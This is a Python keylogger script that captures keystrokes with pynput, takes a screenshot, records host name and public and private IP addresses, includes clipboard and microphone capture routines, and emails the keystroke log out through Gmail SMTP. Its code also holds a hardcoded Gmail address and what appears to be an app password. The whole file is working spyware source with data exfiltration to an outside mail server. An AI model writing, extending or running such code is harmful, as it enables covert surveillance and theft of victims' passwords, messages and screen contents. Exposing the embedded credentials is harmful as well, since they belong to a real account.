import platform
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

screenshot_information = "screenshot.png"
import getpass
from requests import get

from multiprocessing import Process, freeze_support

from PIL import ImageGrab

system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
microphone_time = 10
keys_information = "key_log.txt"
email_address = "site.thesid@gmail.com"
password = "ksxwdctofdngoyqj"
to_address = "site.thesid@gmail.com"

file_path = "C:\\Users\\My\\PycharmProjects\\KeyLogger\\venv"
extend = "\\"


def send_email(filename, attechment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['form'] = from_address
    msg['to'] = to_address
    msg['subject'] = "Log File"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attechment = open(attechment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attechment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', " Attechment ; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


def sys_information():
    with open(file_path + extend + system_information, "a") as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address :" + public_ip + '\n')
        except Exception:
            f.write("Public IP Address : Couldn't get public IP Address" + '\n')

        f.write("Processor :" + (platform.processor()) + '\n')
        f.write("System :" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine :" + platform.machine() + '\n')
        f.write("Host Name :" + host_name + '\n')
        f.write("private IP Address :" + IP_Address + '\n')

sys_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Date :'\n'" + pasted_data)
        except:
            f.write("Clipboard Data could not be copied")
# copy_clipboard()

def microphone():
    fs = 44100
    second = microphone_time
    my_recordings = sd.rec(int(second+fs),samplerate=fs,channels=2)
    sd.wait()
    write(file_path + extend+audio_information,fs,my_recordings)

# microphone()


def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_information)

screenshot()
count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

send_email(keys_information, file_path + extend + keys_information, to_address)
